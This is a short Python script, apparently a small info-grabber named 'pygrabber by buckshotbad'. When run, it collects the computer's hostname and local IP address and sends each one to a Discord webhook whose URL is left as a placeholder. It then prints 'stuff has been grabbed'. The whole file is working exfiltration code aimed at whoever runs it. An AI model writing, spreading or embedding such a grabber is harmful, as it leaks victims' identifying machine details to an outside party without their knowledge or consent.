import socket
from discord_webhook import DiscordWebhook
import time 

hostname=socket.gethostname()
IPAddr=socket.gethostbyname(hostname)

webhook = DiscordWebhook(url="REPLACE WITH DISCORD WEBHOOK", content="The Computer name is: " + hostname)
webhook1 = DiscordWebhook(url="REPLACE WITH DISCORD WEBHOOK", content="The Ip address is: " + IPAddr)
print ("pygrabber by buckshotbad")
response = webhook.execute()
response = webhook1.execute()

print ("stuff has been grabbed")
time.sleep(0.5)

